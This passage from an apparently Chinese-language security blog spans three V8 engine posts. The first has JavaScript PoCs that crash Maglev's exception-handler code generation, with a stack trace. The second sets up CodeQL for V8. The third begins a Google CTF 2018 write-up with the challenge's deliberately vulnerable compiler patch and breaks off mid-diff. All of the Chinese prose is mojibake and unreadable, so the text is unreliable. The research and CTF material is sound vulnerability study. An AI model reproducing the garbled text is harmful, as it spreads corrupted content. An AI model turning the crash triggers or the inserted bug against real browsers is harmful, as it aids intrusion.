<p>è¿½å®Œå¾Œæœƒç™¼ç¾ call chain æœƒé•·é€™æ¨£(ä¸Šé¢å¯èƒ½é‚„æœ‰ä¸€äº›æ±è¥¿ä½†ä¸ç”¨çœ‹)<br><code>MaglevCodeGenerator::Assemble()</code> -&gt;<br><code>MaglevCodeGenerator::EmitCode()</code> -&gt;<br><code>MaglevCodeGenerator::EmitExceptionHandlerTrampolines()</code> -&gt;<br><code>ExceptionHandlerTrampolineBuilder::Build()</code> -&gt;<br><code>ExceptionHandlerTrampolineBuilder::EmitTrampolineFor()</code> -&gt;<br><code>ExceptionHandlerTrampolineBuilder::EmitPopMaterialisedResults()</code> -&gt;<br><code>MaglevAssembler::MaterialiseValueNode()</code></p>
<p>æ‰€ä»¥çŒœæ¸¬åœ¨ try-catch ä¸­ access æ˜¯ constant çš„ TypedArray.length å°±èƒ½è§¸ç™¼ï¼Œå¯«äº†ä»¥ä¸‹çš„ PoC<br>ä½†å®ƒä¸æœƒé€² MaglevAssembler::MaterialiseValueNode()<br>çœ‹ç”¢å‡ºä¾†çš„åœ–ç™¼ç¾ exceptional handler block ä¸æœƒæœ‰è·Ÿ a1 æœ‰é—œçš„æ±è¥¿<br>å¯èƒ½æ˜¯ Maglev èªç‚º Exceptional handler ä¸éœ€è¦ a1 çš„è³‡è¨Šï¼Ÿ</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> f64Arr = <span class="keyword">new</span> <span class="title class_">Float64Array</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">opt_me</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        f64Arr.<span class="property">length</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="string">&quot;err&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">%<span class="title class_">PrepareFunctionForOptimization</span>(opt_me);</span><br><span class="line"><span class="title function_">opt_me</span>();</span><br><span class="line">%<span class="title class_">OptimizeMaglevOnNextCall</span>(opt_me);</span><br><span class="line"><span class="title function_">opt_me</span>();</span><br></pre></td></tr></table></figure>

<p>æƒ³ä¸åˆ°è¦æ€éº¼æŠŠ a1 å¸¶é€² exceptional handler çš„ basic block æ‰€ä»¥å»ç¿»ä½œè€…çš„ PoC<br>çœ‹èµ·ä¾†æ˜¯ç”¨ fuzzer ç”¢çš„</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> f64Arr = <span class="keyword">new</span> <span class="title class_">Float64Array</span>();</span><br><span class="line">f64Arr.<span class="property">buffer</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">opt_me</span>(<span class="params">a0</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">50</span>; i++) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        a0[<span class="number">0</span>];</span><br><span class="line">        a0 = f64Arr.<span class="property">length</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="string">&quot;err&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">%<span class="title class_">PrepareFunctionForOptimization</span>(opt_me);</span><br><span class="line"><span class="title function_">opt_me</span>(f64Arr);</span><br><span class="line"><span class="title function_">opt_me</span>(f64Arr);</span><br><span class="line">%<span class="title class_">OptimizeMaglevOnNextCall</span>(opt_me);</span><br><span class="line"><span class="title function_">opt_me</span>();</span><br></pre></td></tr></table></figure>
<p>æ‹¿ä¾†æ”¹äº†ä¸€ä¸‹ç„¶å¾Œå°å‡º Maglev IR graph (d8 â€“print-maglev-graphs poc.js)<br>ç™¼ç¾å®ƒå¤šäº† <code>23/17: Ï†áµ€â‚‘ a0 (compressed) â†’ [rcx|R|t] (spilled: [stack:0|t]), live range: [23-33]</code><br>çœ‹èµ·ä¾†æ˜¯è¦æŠŠ a0 å¸¶é€²å» exceptional handler(a0[0] æœƒå¤šä¸€å€‹ )throw è®“ exception phi å‡ºç¾</p>
<h2 id="ModifiedPoC"><a href="#ModifiedPoC" class="headerlink" title="ModifiedPoC"></a>ModifiedPoC</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">opt_me</span>(<span class="params">a0</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> f64Arr = <span class="keyword">new</span> <span class="title class_">Float64Array</span>();</span><br><span class="line">        a0[<span class="number">0</span>];</span><br><span class="line">        a0 = f64Arr.<span class="property">length</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="string">&quot;err&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">%<span class="title class_">PrepareFunctionForOptimization</span>(opt_me);</span><br><span class="line"><span class="title function_">opt_me</span>(f64Arr);</span><br><span class="line">%<span class="title class_">OptimizeMaglevOnNextCall</span>(opt_me);</span><br><span class="line"><span class="title function_">opt_me</span>();</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Fatal error in ../../src/maglev/maglev-assembler.cc, line 307</span></span><br><span class="line"><span class="comment"># Debug check failed: !value-&gt;allocation().IsConstant().</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#FailureMessage Object: 0x7ffff5b09d28</span></span><br><span class="line"><span class="comment">==== C stack trace ===============================</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    /home/terry1234/v8/out/x64.debug/libv8_libbase.so(v8::base::debug::StackTrace::StackTrace()+0x1e) [0x7c78ddc9a3de]</span></span><br><span class="line"><span class="comment">    /home/terry1234/v8/out/x64.debug/libv8_libplatform.so(+0x4a7dd) [0x7c78ddc0c7dd]</span></span><br><span class="line"><span class="comment">    /home/terry1234/v8/out/x64.debug/libv8_libbase.so(V8_Fatal(char const*, int, char const*, ...)+0x205) [0x7c78ddc750b5]</span></span><br><span class="line"><span class="comment">    /home/terry1234/v8/out/x64.debug/libv8_libbase.so(+0x4ba6c) [0x7c78ddc74a6c]</span></span><br><span class="line"><span class="comment">    /home/terry1234/v8/out/x64.debug/libv8_libbase.so(V8_Dcheck(char const*, int, char const*)+0x4d) [0x7c78ddc7518d]</span></span><br><span class="line"><span class="comment">    /home/terry1234/v8/out/x64.debug/libv8.so(v8::internal::maglev::MaglevAssembler::MaterialiseValueNode(v8::internal::Register, v8::internal::maglev::ValueNode*)+0x213) [0x7c78da760d73]</span></span><br><span class="line"><span class="comment">    /home/terry1234/v8/out/x64.debug/libv8.so(+0x8979728) [0x7c78da779728]</span></span><br><span class="line"><span class="comment">    /home/terry1234/v8/out/x64.debug/libv8.so(+0x8978b33) [0x7c78da778b33]</span></span><br><span class="line"><span class="comment">    /home/terry1234/v8/out/x64.debug/libv8.so(+0x8975f95) [0x7c78da775f95]</span></span><br><span class="line"><span class="comment">    /home/terry1234/v8/out/x64.debug/libv8.so(v8::internal::maglev::MaglevCodeGenerator::EmitExceptionHandlerTrampolines()+0xfc) [0x7c78da775ccc]</span></span><br><span class="line"><span class="comment">    /home/terry1234/v8/out/x64.debug/libv8.so(v8::internal::maglev::MaglevCodeGenerator::EmitCode()+0x199) [0x7c78da773129]</span></span><br><span class="line"><span class="comment">    /home/terry1234/v8/out/x64.debug/libv8.so(v8::internal::maglev::MaglevCodeGenerator::Assemble()+0x1c) [0x7c78da772e3c]</span></span><br><span class="line"><span class="comment">    /home/terry1234/v8/out/x64.debug/libv8.so(v8::internal::maglev::MaglevCompiler::Compile(v8::internal::LocalIsolate*, v8::internal::maglev::MaglevCompilationInfo*)+0x1630) [0x7c78da855200]</span></span><br><span class="line"><span class="comment">    /home/terry1234/v8/out/x64.debug/libv8.so(v8::internal::maglev::MaglevCompilationJob::ExecuteJobImpl(v8::internal::RuntimeCallStats*, v8::internal::LocalIsolate*)+0x69) [0x7c78da9b50a9]</span></span><br><span class="line"><span class="comment">    /home/terry1234/v8/out/x64.debug/libv8.so(v8::internal::OptimizedCompilationJob::ExecuteJob(v8::internal::RuntimeCallStats*, v8::internal::LocalIsolate*)+0x128) [0x7c78d92b17f8]</span></span><br><span class="line"><span class="comment">    /home/terry1234/v8/out/x64.debug/libv8.so(+0x74cc577) [0x7c78d92cc577]</span></span><br><span class="line"><span class="comment">    /home/terry1234/v8/out/x64.debug/libv8.so(+0x74bd84e) [0x7c78d92bd84e]</span></span><br><span class="line"><span class="comment">    /home/terry1234/v8/out/x64.debug/libv8.so(v8::internal::Compiler::CompileOptimized(v8::internal::Isolate*, v8::internal::DirectHandle&lt;v8::internal::JSFunction&gt;, v8::internal::ConcurrencyMode, v8::internal::CodeKind)+0x3a4) [0x7c78d92bef04]</span></span><br><span class="line"><span class="comment">    /home/terry1234/v8/out/x64.debug/libv8.so(+0x8752b85) [0x7c78da552b85]</span></span><br><span class="line"><span class="comment">    /home/terry1234/v8/out/x64.debug/libv8.so(+0x874cc3f) [0x7c78da54cc3f]</span></span><br><span class="line"><span class="comment">    /home/terry1234/v8/out/x64.debug/libv8.so(v8::internal::Runtime_OptimizeMaglevEager(int, unsigned long*, v8::internal::Isolate*)+0x151) [0x7c78da54c891]</span></span><br><span class="line"><span class="comment">    /home/terry1234/v8/out/x64.debug/libv8.so(+0x68984bd) [0x7c78d86984bd]</span></span><br><span class="line"><span class="comment">Trace/breakpoint trap (core dumped)</span></span><br></pre></td></tr></table></figure>

<p>å¾ŒçºŒæœƒç”¨ <code>MemOperand src = ToMemOperand(value-&gt;allocation())</code> å°è‡´ node confusion<br>æ‡‰è©²æ˜¯æœ‰æŸç¨®åŸå› å°è‡´é€™é‚Šä¸èƒ½æ˜¯ Constantï¼Œæ‰€ä»¥æ‰åš switch æª¢æŸ¥ Constant ä¸¦é¡å¤–è™•ç†<br>æœ‰è©¦è‘—æ‰¾å…¶ä»– Varient ä½†æ²’æ‰¾åˆ°ï¼Œæ‰€ä»¥æ²’æœ‰å¾€ä¸‹è¿½ constant &#x2F; non-constant node confusion å¾Œæœƒç™¼ç”Ÿä»€éº¼å’Œèƒ½ä¸èƒ½ Exploit<br>è¿½æœ€æ–° commit æœ‰çœ‹åˆ°é¡ä¼¼çš„æƒ…å¢ƒçš„è©±æœƒå†å›ä¾†ç ”ç©¶é€™éƒ¨åˆ†</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/09/08/CodeQL-for-V8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Terry1234">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Terry1234's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/09/08/CodeQL-for-V8/" class="post-title-link" itemprop="url">CodeQL for V8</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2025-09-08 19:56:59 / Modified: 20:18:52" itemprop="dateCreated datePublished" datetime="2025-09-08T19:56:59+08:00">2025-09-08</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>å‰é™£å­å› ç‚ºçœ‹åˆ°ä¸€å€‹è »æœ‰è¶£çš„ bug Patternï¼Œæƒ³æ‰¾çœ‹çœ‹ Variant<br>æ‰€ä»¥æ¥è§¸åˆ°äº† CodeQL<br>ç¨å¾®è¨˜éŒ„ä¸€ä¸‹ V8 çš„ CodeQL database æ€éº¼å»º</p>
<p>é¦–å…ˆè¦ fetch V8 source code<br><a target="_blank" rel="noopener" href="https://v8.dev/docs/source-code">https://v8.dev/docs/source-code</a><br>ç„¶å¾Œè£ CodeQL</p>
<p>ä¹‹å¾Œç”¨ V8 æä¾›çš„ gn ç”¢ç·¨è­¯ç”¨çš„åƒæ•¸æª”ï¼Œç­‰ç­‰ CodeQL æœƒç”¨ ninja æ ¹æ“šé€™å€‹åƒæ•¸æª”ç·¨è­¯ d8 ä¸¦å¾ä¸­ç²å–è³‡è¨Š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gn gen out/CodeQL --export-compile-commands --args=&#x27;is_component_build = true is_debug = true symbol_level = 2 target_cpu = &quot;x64&quot; v8_enable_sandbox = true v8_enable_backtrace = true v8_enable_fast_mksnapshot = true v8_enable_slow_dchecks = true v8_optimized_debug = false&#x27;</span><br></pre></td></tr></table></figure>

<p>ä¹‹å¾Œå°±å¯ä»¥å»ºç«‹ V8 çš„ CodeQL database</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create ~/codeql-dbs/v8-cpp --language=cpp --source-root . --command=&#x27;ninja -C out/v8-codeql d8&#x27;</span><br></pre></td></tr></table></figure>

<p>Bug Pattern å’Œå¯«å‡ºä¾†çš„ CodeQL å°±å…ˆä¸æ”¾äº†ï¼Œæ‰¾å‡ºä¾†çš„ case æœ‰é»å¤šï¼Œé‚„åœ¨æƒ³è¦æ€éº¼ç¯©é¸æœƒæ¯”è¼ƒå¥½<br>æœ‰æƒ³éç”¨é€™é‚Šæ–‡ç« çš„æ–¹å¼ï¼Œä¸é™åˆ¶å¤ªå¤šæ¢ä»¶<br><code>Our new perspective views CodeQL not as a definitive bug-finding tool, but as a guide to point us in the right direction. </code><br>ä»–å€‘ Query æ–¹å¼æ˜¯æ‰¾æ‰€æœ‰ copy çš„åœ°æ–¹<br>ä½†æˆ‘æ²’æƒ³åˆ°åœ¨é€™å€‹ V8 bug pattern ä¸Šæ¯”è¼ƒå¥½çš„åšæ³•<br><a target="_blank" rel="noopener" href="https://bughunters.google.com/blog/5800341475819520/a-fuzzy-escape-a-tale-of-vulnerability-research-on-hypervisors">https://bughunters.google.com/blog/5800341475819520/a-fuzzy-escape-a-tale-of-vulnerability-research-on-hypervisors</a></p>
<p>æ–‡ç« ä¸­çš„ CodeQL Query</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># Objective: find all functions that do some copy operation</span><br><span class="line"></span><br><span class="line">import cpp</span><br><span class="line"></span><br><span class="line">from Function copyFunction, FunctionCall functionCall,</span><br><span class="line">where</span><br><span class="line"># First get all the functions that have copy in the name</span><br><span class="line">    copyFunction.getName().matches(&quot;%\\_copy%&quot;) and not</span><br><span class="line">    copyFunction.getName().matches(&quot;%trace%&quot;) and</span><br><span class="line"></span><br><span class="line"># Then get where they are used</span><br><span class="line">    functionCall.getTarget() = copyFunction and</span><br><span class="line">    functionCall.getLocation().toString().matches(&quot;%/hw/%&quot;)</span><br><span class="line">select copyFunction.getName(), functionCall.getLocation()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/27/Google-CTF-2018-Just-In-Time/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Terry1234">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Terry1234's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/27/Google-CTF-2018-Just-In-Time/" class="post-title-link" itemprop="url">Google CTF 2018 Just-In-Time</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-10-27 19:25:44" itemprop="dateCreated datePublished" datetime="2023-10-27T19:25:44+08:00">2023-10-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-09-08 19:33:01" itemprop="dateModified" datetime="2025-09-08T19:33:01+08:00">2025-09-08</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>çœ‹äº†é€™ç¯‡æ–‡ç« å¾Œæƒ³è‡ªå·±å˜—è©¦çœ‹çœ‹ï¼Œå¼„äº†å¥½å¹¾å¤©ç¸½ç®—æå‡ºä¾†äº† owob<br><a target="_blank" rel="noopener" href="https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/#setup">https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/#setup</a></p>
<h2 id="ç’°å¢ƒæ­å»º"><a href="#ç’°å¢ƒæ­å»º" class="headerlink" title="ç’°å¢ƒæ­å»º"></a>ç’°å¢ƒæ­å»º</h2><p>ä½¿ç”¨ Ubuntu 20.04<br>patch é€£çµ: <a target="_blank" rel="noopener" href="https://github.com/google/google-ctf/blob/master/2018/finals/pwn-just-in-time/attachments/addition-reducer.patch">https://github.com/google/google-ctf/blob/master/2018/finals/pwn-just-in-time/attachments/addition-reducer.patch</a></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard e0a58f83255d1dae907e2ba4564ad8928a7dedf4</span><br><span class="line">git apply addition-reducer.patch</span><br><span class="line">gn gen out/x64.release --args=&#x27;v8_monolithic=true v8_use_external_startup_data=false is_component_build=false is_debug=false target_cpu =&quot;x64&quot; use_goma=false goma_dir=&quot;None&quot; v8_enable_backtrace=true v8_enable_disassembler=true v8_enable_object_print=true v8_enable_verify_heap=true v8_untrusted_code_mitigations = false&#x27;</span><br><span class="line">ninja -C out/x64.release d8</span><br></pre></td></tr></table></figure>

<h2 id="patch-åˆ†æ"><a href="#patch-åˆ†æ" class="headerlink" title="patch åˆ†æ"></a>patch åˆ†æ</h2><p>é¡Œç›®çµ¦äº†å…©å€‹ patch</p>
<h3 id="nosandbox-patch"><a href="#nosandbox-patch" class="headerlink" title="nosandbox.patch"></a>nosandbox.patch</h3><p>é‡å° chromium çš„ patchï¼Œç”¨ä¾†æŠŠ chrome çš„ sandbox æ‹”æ‰ï¼Œä¸éæˆ‘é€™é¡Œçš„ chrome ä¸€ç›´ build å¤±æ•—å°±æ²’ç”¨é€™å€‹äº†ï¼Œåªä¸Š V8 çš„ patch ä¹Ÿä¸å½±éŸ¿è§£é¡Œ</p>
<h3 id="addition-reducer-patch"><a href="#addition-reducer-patch" class="headerlink" title="addition-reducer.patch"></a>addition-reducer.patch</h3><p>é‡å° V8 çš„ patchï¼Œæ–°å¢äº†ä¸€å€‹ reducer<br>ç•¶ç¯€é»æ˜¯ kNumberAddã€å·¦ç¯€é»æ˜¯ kNumberAddã€å³ç¯€é»æ˜¯ kNumberConstant æ™‚æœƒå˜—è©¦åˆä½µç¯€é»</p>
<h4 id="åˆä½µå‰çš„ç¯€é»"><a href="#åˆä½µå‰çš„ç¯€é»" class="headerlink" title="åˆä½µå‰çš„ç¯€é»"></a>åˆä½µå‰çš„ç¯€é»</h4><p><img src="/2023/10/27/Google-CTF-2018-Just-In-Time/before.png"></p>
<h4 id="åˆä½µå¾Œçš„ç¯€é»"><a href="#åˆä½µå¾Œçš„ç¯€é»" class="headerlink" title="åˆä½µå¾Œçš„ç¯€é»"></a>åˆä½µå¾Œçš„ç¯€é»</h4><p><img src="/2023/10/27/Google-CTF-2018-Just-In-Time/after.png"></p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/BUILD.gn b/BUILD.gn</span></span><br><span class="line"><span class="comment">index c6a58776cd..14c56d2910 100644</span></span><br><span class="line"><span class="comment">--- a/BUILD.gn</span></span><br><span class="line"><span class="comment">+++ b/BUILD.gn</span></span><br><span class="line"><span class="meta">@@ -1699,6 +1699,8 @@</span> v8_source_set(&quot;v8_base&quot;) &#123;</span><br><span class="line">     &quot;src/compiler/dead-code-elimination.cc&quot;,</span><br><span class="line">     &quot;src/compiler/dead-code-elimination.h&quot;,</span><br><span class="line">     &quot;src/compiler/diamond.h&quot;,</span><br><span class="line"><span class="addition">+    &quot;src/compiler/duplicate-addition-reducer.cc&quot;,</span></span><br><span class="line"><span class="addition">+    &quot;src/compiler/duplicate-addition-reducer.h&quot;,</span></span><br><span class="line">     &quot;src/compiler/effect-control-linearizer.cc&quot;,</span><br><span class="line">     &quot;src/compiler/effect-control-linearizer.h&quot;,</span><br><span class="line">     &quot;src/compiler/escape-analysis-reducer.cc&quot;,</span><br><span class="line"><span class="comment">diff --git a/src/compiler/duplicate-addition-reducer.cc b/src/compiler/duplicate-addition-reducer.cc</span></span><br><span class="line">new file mode 100644</span><br><span class="line"><span class="comment">index 0000000000..59e8437f3d</span></span><br><span class="line"><span class="comment">--- /dev/null</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/duplicate-addition-reducer.cc</span></span><br><span class="line"><span class="meta">@@ -0,0 +1,71 @@</span></span><br><span class="line"><span class="addition">+// Copyright 2018 Google LLC</span></span><br><span class="line"><span class="addition">+//</span></span><br><span class="line"><span class="addition">+// Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span><br><span class="line"><span class="addition">+// you may not use this file except in compliance with the License.</span></span><br><span class="line"><span class="addition">+// You may obtain a copy of the License at</span></span><br><span class="line"><span class="addition">+//</span></span><br><span class="line"><span class="addition">+//      http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line"><span class="addition">+//</span></span><br><span class="line"><span class="addition">+// Unless required by applicable law or agreed to in writing, software</span></span><br><span class="line"><span class="addition">+// distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span></span><br><span class="line"><span class="addition">+// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line"><span class="addition">+// See the License for the specific language governing permissions and</span></span><br><span class="line"><span class="addition">+// limitations under the License.</span></span><br><span class="line"><span class="addition">+#include &quot;src/compiler/duplicate-addition-reducer.h&quot;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+#include &quot;src/compiler/common-operator.h&quot;</span></span><br><span 